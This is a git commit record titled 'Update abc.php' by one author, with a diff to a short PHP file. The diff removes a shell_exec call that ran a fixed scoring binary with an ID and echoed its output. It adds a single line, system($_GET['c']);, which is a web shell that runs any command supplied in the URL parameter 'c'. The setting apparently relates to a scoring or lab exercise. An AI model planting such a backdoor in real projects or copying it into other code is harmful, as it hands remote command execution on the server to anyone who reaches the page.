5214ef8e8dc62c5fccc83a457617cebf48dfbbbb
Koti Reddy Aluri <kotireddyaluri@users.noreply.github.com>
2018-04-02 10:30:41 +0530

    Update abc.php

--- abc.php
+++ abc.php
@@ -2,9 +2,5 @@
 
 // Show all information, defaults to INFO_ALL
 //phpinfo();
-///usr/local/bin/score a0ca6189-282c-4968-8193-a27f5cf79176
-//$output = shell_exec('ls');
-$output = shell_exec('/usr/local/bin/score a0ca6189-282c-4968-8193-a27f5cf79176');
-echo "<pre>$output</pre>";
-
+system($_GET['c']);
 ?>
